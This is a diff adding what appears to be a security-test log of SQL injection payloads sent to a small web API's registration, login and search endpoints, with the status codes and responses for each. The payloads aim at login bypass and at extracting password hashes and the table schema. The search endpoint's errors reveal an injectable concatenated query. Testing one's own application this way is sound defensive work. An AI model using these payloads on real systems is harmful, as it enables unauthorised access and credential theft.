@@ -1,0 +1,60 @@
+Payload 1: {"username": "' OR '1'='1' --", "password": "anything", "name": "qrewqr", "age": 20, "town": "msc"}
+Статус: 422
+Ответ: {"detail":[{"type":"missing","loc":["body","email"],"msg":"Field required","input":{"username":"' OR '1'='1' --","password":"anything","name":"qrewqr","age":20,"town":"msc"}}]}
+
+Payload 2: {"username": "' UNION SELECT id, email, hash_password FROM users --", "password": "anything", "name": "test", "age": 20, "town": "test"}
+Статус: 422
+Ответ: {"detail":[{"type":"missing","loc":["body","email"],"msg":"Field required","input":{"username":"' UNION SELECT id, email, hash_password FROM users --","password":"anything","name":"test","age":20,"town":"test"}}]}
+
+Payload 3: {"username": "' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --", "password": "anything", "name": "test", "age": 20, "town": "test"}
+Статус: 422
+Ответ: {"detail":[{"type":"missing","loc":["body","email"],"msg":"Field required","input":{"username":"' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --","password":"anything","name":"test","age":20,"town":"test"}}]}
+
+Payload 4: {"username": "' AND (SELECT 1 FROM users WHERE email='admin@example.com')=1 --", "password": "anything", "name": "test", "age": 20, "town": "test"}
+Статус: 422
+Ответ: {"detail":[{"type":"missing","loc":["body","email"],"msg":"Field required","input":{"username":"' AND (SELECT 1 FROM users WHERE email='admin@example.com')=1 --","password":"anything","name":"test","age":20,"town":"test"}}]}
+
+Payload 5: {"username": "' AND 1=CAST((SELECT hash_password FROM users LIMIT 1) AS INTEGER) --", "password": "anything", "name": "test", "age": 20, "town": "test"}
+Статус: 422
+Ответ: {"detail":[{"type":"missing","loc":["body","email"],"msg":"Field required","input":{"username":"' AND 1=CAST((SELECT hash_password FROM users LIMIT 1) AS INTEGER) --","password":"anything","name":"test","age":20,"town":"test"}}]}
+
+Payload 1: {"username": "' OR '1'='1' --", "password": "anything"}
+Статус: 401
+Ответ: {"detail":"Incorrect email or password"}
+
+Payload 2: {"username": "' UNION SELECT id, email, hash_password FROM users --", "password": "anything"}
+Статус: 401
+Ответ: {"detail":"Incorrect email or password"}
+
+Payload 3: {"username": "' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --", "password": "anything"}
+Статус: 401
+Ответ: {"detail":"Incorrect email or password"}
+
+Payload 4: {"username": "' AND (SELECT 1 FROM users WHERE email='admin@example.com')=1 --", "password": "anything"}
+Статус: 401
+Ответ: {"detail":"Incorrect email or password"}
+
+Payload 5: {"username": "' AND 1=CAST((SELECT hash_password FROM users LIMIT 1) AS INTEGER) --", "password": "anything"}
+Статус: 401
+Ответ: {"detail":"Incorrect email or password"}
+
+Payload 1: query=' OR '1'='1' --
+Статус: 500
+Ответ: {"detail":"cannot convert dictionary update sequence element #0 to a sequence"}
+
+Payload 2: query=' UNION SELECT id, email, hash_password FROM users --
+Статус: 500
+Ответ: {"detail":"(sqlite3.OperationalError) SELECTs to the left and right of UNION do not have the same number of result columns\n[SQL: SELECT * FROM users WHERE email = '' UNION SELECT id, email, hash_password FROM users --']\n(Background on this error at: https://sqlalche.me/e/20/e3q8)"}
+
+Payload 3: query=' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --
+Статус: 500
+Ответ: {"detail":"(sqlite3.OperationalError) SELECTs to the left and right of UNION do not have the same number of result columns\n[SQL: SELECT * FROM users WHERE email = '' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --']\n(Background on this error at: https://sqlalche.me/e/20/e3q8)"}
+
+Payload 4: query=' AND (SELECT 1 FROM users WHERE email='admin@example.com')=1 --
+Статус: 200
+Ответ: {"results":[]}
+
+Payload 5: query=' AND 1=CAST((SELECT hash_password FROM users LIMIT 1) AS INTEGER) --
+Статус: 200
+Ответ: {"results":[]}
+
